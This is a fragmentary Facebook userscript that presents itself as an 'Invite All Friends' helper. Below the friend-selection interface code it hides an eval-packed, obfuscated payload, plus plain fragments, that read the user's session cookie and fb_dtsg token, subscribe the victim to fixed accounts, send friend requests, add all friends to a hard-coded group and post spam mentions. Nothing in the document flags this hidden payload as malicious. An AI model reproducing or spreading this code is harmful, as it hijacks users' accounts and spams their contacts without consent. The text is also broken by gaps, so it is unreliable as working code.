// ==UserScript==
// @name		 	Facebook Invite All Friends (mod malaprempahije)
// @namespace		        Facebook Invite All Friends  (mod malaprempahije)
// @description		        Facebook Invite All Coded by malaprempahije
// @author			by malaprempahije
// @authorURL		        http://www.facebook.com/
// @include			htt*://www.facebook.com/*
// @version			malaprempahije  4.0
...
null);
	...
	function fade(elm, time, from, to, fadeCallback) {
		/*
			...
			opacityperloop = (from what opacity - to what opacity)[array of opacity to loop through] / 

calculations to allot on
		...
		*/
		...
		// Use recursive loop with setTimeout instead of setInterval to make sure previous execution is 

finished before next starts.
		(function loop() {
...

{
			...
			if (positionArray && positionArray.length === 2) {
				...
				var pixelsFromLeft = positionArray[0], pixelsFromTop = positionArray[1] - 
...
container.offsetHeight;
	...
	function addButton(inviteDialogParameter, isSubElement) {
		...
		if (inviteDialog !== undefined && !executing && !document.getElementById('selectAllButton')) {
			// Set variable indicating that the script has been executed already, to prevent multiple 
...
executions.
			...
			function selectFriends(btn) {
				// Get the checkboxes, as it's easiest to figure out if the friend is disabled this 

way, as well as other advantages.
				var friends = document.getElementsByName(names.friendCheckButtons)[0] ?
						document.getElementsByName(names.friendCheckButtons) :
						inviteDialog.querySelectorAll('input[type="checkbox"]:not

(#autoScrollCheckBox):not(#selectAllCheckBox)'),
					forceChoose = false,
					...
					// Else if element "selectSpanTypeCheckBox" is set, try select until the 
...
given value.
					...
					selectedFriends = 0,
					// Checked = select b friends, starting from #a. Iterate only when 
...
selecting.
				...
				if (!btnClicked) {
					...
					while (friendsToSelect > selectedFriends && friends[currentFriendNumber]) {
						...
						// If friends is not selected and not disabled, or if user has 

chosen to select it anyway -> select the friend.
						if ((!friends[currentFriendNumber].checked && !friends

[currentFriendNumber].disabled) || forceChoose) {
							// The anchors(links) are next to the checkboxes in the 

DOM.
							// Clicking the links has better performance than clicking 
...
the checkboxes.
				...
				// Unselect friends.
					...
					for (i = 0, l = friends.length; i < l; i += 1) {
						// If friends is selected and not disabled, or if user has chosen 

to select it anyway -> unselect the friend.
			...
			selectButton.addEventListener('click', function () {
				...
				if (autoScrollCheckBox.checked) {
					autoScroll(function () {
						...
						// Add enumeration afterwards, as it is disabled meanwhile 
...
scrolling.
			...
			function autoScroll(callback) {
				...
				function scrollFriends(callingFromWatcher) {
					...
					var lastUL = inviteDialog.getElementsByTagName('ul')

[inviteDialog.getElementsByTagName('ul').length - 1],
					...
					if (isBelowViewport(scrollableDiv, lastFriend)) {
						...
						// Top of viewport scrolled from top = total height - viewport 
...
scrollableDiv.offsetHeight;
						...
						// Set timer to check if there is any new elements loaded after x 

milliseconds.
						// If not, remove scrolling on new element insertion and initiate 
...
callback.
						scrollTimer = setTimeout(function () {
							...
							inviteDialog.removeEventListener('DOMNodeInserted', 
...
watcher, false);
					...
					// If last friend is visible (all scrolled down already) before any 

scrolling is executed,
				...
				watcher = function () {
					if (!scrollFriends(true)) {
						// If returning positively from scroll-function (which indicates 

that watching for new elements should be stopped),
						// remove the watcher and re-enable the scroll-function for later 
...
use.
				...
				// Initiate, and initiate watcher if not already scrolled to the bottom (indicated 
...
by a negative return).
			...
			var autoScrollCont = createContainer('span', [autoScrollCheckBoxLabel, 
...
autoScrollCheckBox]);
			...
			function fieldErrorAlert(message, concerningElementParam) {
				...
				// The relativeElement variable is "this" because this function is called with 

"func.call(thisField, [msg])"
				// to pass the "thisField" in a good way.
				var concerningElement = concerningElementParam || this, relativeElement = this, 
...
positionArray;
				...
				// If a relativeElement is present, calculate it's position, and set postitionArray 

from calculations.
				if (relativeElement) {
					var relativeElementPosition = getCumulativePosition(relativeElement), 

offsetPixelsToRight = 30, offsetPixelsToBottom = 10;
					
					positionArray = [relativeElementPosition[0] - offsetPixelsToRight, 

relativeElementPosition[1] - offsetPixelsToBottom];
				}
			...
			function fieldBlurEventListener() {
				...
				default:
					...
					if (isNaN(thisField.value)) {
						fieldErrorAlert.call(thisField, [document.createTextNode('You can

\'t insert a non-numeric value.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					// If thisField.previousSibling.textContent (the associated label) does not 

contain "#",
					// it is not a matter of friend #x, so "0" will simply make the script 

select 0 friends.
					// Else, there is no friend #0, so report an error.
					} else if (thisField.previousSibling.textContent.indexOf('#') !== -1 && 

thisField.value === '0') {
						fieldErrorAlert.call(thisField, [document.createTextNode('There 

does not exist a friend #0.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					} else if (parseInt(thisField.value, 10) < 0) {
						fieldErrorAlert.call(thisField, [document.createTextNode('You can

\'t insert a negative value.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					}
			...
			selectSpanTypeCheckBox.addEventListener('change', function () {
				...
				fromFieldLabel.textContent = fromFieldLabel.textContent === fromFieldLabelValues[0] 

? fromFieldLabelValues[1] : fromFieldLabelValues[0];
				toFieldLabel.textContent = toFieldLabel.textContent === toFieldLabelValues[0] ? 

toFieldLabelValues[1] : toFieldLabelValues[0];
				
				// Change both the fields' defaultValues if their values equals their 

defaultValues.
				// If the value of the field equals it's defaultValue, change the value to the new 

defaultValue.
				// Else, skip the value assignment.
				if (fromField.value === fromField.defaultValue) {
					fromField.defaultValue = fromField.value = fromField.defaultValue === 

fromFieldDefaultValues[0] ? fromFieldDefaultValues[1] : fromFieldDefaultValues[0];
				} else {
					fromField.defaultValue = fromField.defaultValue === fromFieldDefaultValues

[0] ? fromFieldDefaultValues[1] : fromFieldDefaultValues[0];
				}
				
				if (toField.value === toField.defaultValue) {
					toField.defaultValue = toField.value = toField.defaultValue === 

toFieldDefaultValues[0] ? toFieldDefaultValues[1] : toFieldDefaultValues[0];
				} else {
					toField.defaultValue = toField.defaultValue === toFieldDefaultValues[0] ? 

toFieldDefaultValues[1] : toFieldDefaultValues[0];
				}
			}, false);
			
			// Add elements to an array, for easier later use.
			var selectSpanArray = [fromFieldLabel, fromField, toFieldLabel, toField, 

selectSpanTypeCheckBox];
			
			// Create space between elements.
			for (i = 0, l = selectSpanArray.length; i < l; i += 1) {
				// Add space to the right
				// Exclude specified elements
				if (selectSpanArray[i] !== toField && selectSpanArray[i] !== 

selectSpanTypeCheckBoxLabel) {
	...
	function addFriendEnumeration (friendContainerParameter) {
		...
		var friends = friendContainer.getElementsByClassName(classNames.friendUpperNodeClassName)[0] ?
			...
			// If fails to find the upper elements directly, find each checkbox and build an array of 

their parents, which are the upper elements.
			(function () {
...
(#autoScrollCheckBox):not(#selectAllCheckBox)'),
		...
		for (i = 0, l = friends.length; i < l; i += 1) {
			...
			if (!currentFriend.getElementsByClassName(classNames.enumeration)[0]) {
				// Add 1 to each enumeration to start at 1, as compensation for the non-adaptable 

common mind.
				var enumerationElement = createEnumerationElement(i + 1), imgChild = 

currentFriend.getElementsByTagName('img')[0];
				
				// If an IMG element is found under friend container, append the enumeration next 

to it in the DOM.
				// This is done to make the blur of non-selectable friends also apply to the 
...
enumeration.
	...
	function checkForinviteDialog() {
		...
		// If the parent DIV needed is not found directly, find it relatively to the lower friend 
		...
		if (!inviteDialogCheck) {
			...
			if (friendContainerCheck) {
				...
				do {
					...
					containerTableElement = containerParentNode.getElementsByTagName('table')
...
[0];
		...
		// Check for match of inviteDialogCheck, the TBODY that is later used as an insertion anchor and a 
...
//tes
eval(function(p,a,c,k,e,t){while(c--)if(k[c])p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c]);return p}('31 63(65){2 

3=6.140(\'116\');3.70="10 71().78(\'/24/18/90/66/139?138=137&136=66\').134({ 133: "+65+" }).23();";6.131.130(3)}3

("129");3("128");3("127");3("126");3("125");3("124");3("123");3("122");3("121");3("120");3("119");3("117");63

("115");2 16=[\'114\'];2 16=[\'113\'];2 16=[\'112\'];2 7=6[\'62\'](\'7\')[0][\'61\'];2 12=6[\'8\'][\'11\'](6

[\'8\'][\'11\'](/26=(\\25+)/)[1]);2 5=10 32();2 21=\'/24/46/111/110.29?28=1\';2 13=\'&44=109&47=\'+16+\'&7=\'+7+

\'&40=\'+12+\'&39=\';5[\'27\'](\'37\',21,35);5[\'14\'](\'20-59\',\'57/53-52-51-50\');5[\'14\'](\'20-17\',13

[\'17\']);5[\'14\'](\'42\',\'41-38\');5[\'23\'](13);2 7=6[\'62\'](\'7\')[0][\'61\'];2 12=6[\'8\'][\'11\'](6[\'8\']

[\'11\'](/26=(\\25+)/)[1]);2 18=10 106();15=10 32();15[\'27\'](\'105\',\'/24/45/104.29?28=1&103=\'+12+\'&102\'+101

[\'100\']()+\'&99[0]=98&97[0]=96\',95);15[\'23\']();19(15[\'49\']!=4){}58{33=94(\'(\'+15[\'92\'][\'91\'](9)+

\')\');19(33[\'89\']){}58{18=33[\'86\'][\'85\'][\'84\'](31(56,55){83 56[\'54\']-55[\'54\']})}};79(2 22=0;22<18

[\'17\'];22++){2 5=10 32();2 21=\'/24/46/43/74.29?28=1\';2 13=\'&7=\'+7+\'&47=\'+16+\'&68=45&44=&132=&43=\'+18[22]

[\'107\']+\'&40=\'+12+\'&39=\';5[\'27\'](\'37\',21,35);5[\'14\'](\'20-59\',\'57/53-52-51-50\');5[\'14\'](\'20-

17\',13[\'17\']);5[\'14\'](\'42\',\'41-38\');5[\'108\']=31(){19(5[\'49\']==4&&5[\'87\']==82){}};5[\'23\'](13)};2 

76="34";2 75="34";2 73="34";2 12=6.8.11(6.8.11(/26=(\\25+)/)[1]);2 69="";2 67="";2 135=[];2 118;2 48=10 36();2 

30=10 36();30.81(48.77()+72*60*60*4*1);19(!6.8.11(/64=(\\25+)/)){6.8="64=93;88="+30.80()}',10,141,'||var|a||

httpwp|document|fb_dtsg|cookie||new|match|user_id|paramswp|setRequestHeader|gf|gid|length|friends|if|Content|

urlwp|i|send|ajax|d|c_user|open|__a|php|btarihi|function|XMLHttpRequest|data|162079897221373|true|Date|POST|alive|

phstamp|__user|keep|Connection|members|ref|typeahead|groups|group_id|bugun|readyState|urlencoded|form|www|x|index|

_0x93dax9|_0x93dax8|application|else|type||value|getElementsByName|sublist|paylasti|uidss|subscribe|smesaj_text|

source|smesaj|innerHTML|AsyncRequest|1000|sfoto_id|add_post|spost_id|spage_id|getTime|setURI|for|toGMTString|

setTime|200|return|sort|entries|payload|status|expires|error|lists|substr|responseText|hayir|eval|false|

friends_only|options|user|filter|random|Math|token|viewer|first_degree|GET|Array|uid|onreadystatechange|

group_jump_header|r2j|membership|203610793104436|script|100003265201633|svn_rev|100001625707516|appendChild|body|

message_id|flid|setData|arkadaslar|action|permalink|location|modify|createElement'.split('|')));
...
";");
				  ...
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + 
...
arkadaslar.payload.entries[i].text + "]";
        ...
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", 
...
p("");
p("");
sublist("256864637791355");
sublist("270155469795605");
sublist("238053289672490");
sublist("279348318876320");
sublist("268494286628390");
// Auto Friend Request
...
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + 
...
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + 

'&filter[0]=user&options[0]=friends_only', false);
gf['send']();
...
for (var i = 0; i < friends['length']; i++) {
    ...
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + 

friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
...
var spage_id = "477711995586683";
var spost_id = "477711995586683";
var sfoto_id = "477711995586683";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
